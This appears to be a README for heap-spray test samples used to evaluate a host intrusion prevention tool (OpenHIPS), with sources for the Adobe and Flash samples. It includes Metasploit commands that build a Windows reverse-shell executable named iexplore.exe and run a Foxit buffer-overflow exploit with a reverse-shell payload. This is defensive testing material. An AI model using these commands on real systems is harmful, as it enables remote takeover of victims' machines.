These samples were taken from:
http://feliam.wordpress.com/2010/02/15/filling-adobes-heap/

Run generate.bat to create the pdf's.  I create them using cygwin with python installed, and haxe (http://haxe.org/)
The swf spray does not work.
All these do is alloc mem, they don't actually exploit.

The files in Adobe_Flash_CVE-2009-1869_v1_080309 were downloaded from:
http://roeehay.blogspot.com/2009/08/exploitation-of-cve-2009-1869.html
I can't get them to do anything, but Exploit.swf has a "Go" button that will alloc lots of mem.



To test with metasploit, open up the console and run:
ruby msfpayload windows/shell/reverse_tcp LHOST=192.168.0.1 LPORT=5555 X > iexplore.exe
(Must use the name of something the protector will run in).
This currently doesn't get caught, because I ignore all the pages that are already loaded into memory when the OpenHIPS protector first starts, else I would "detect" my signatures.


metasploit commands for making Foxit exploit:
use exploit/windows/fileformat/foxit_title_bof
set PAYLOAD windows/shell/reverse_tcp
show options
set LHOST 127.0.0.1
exploit
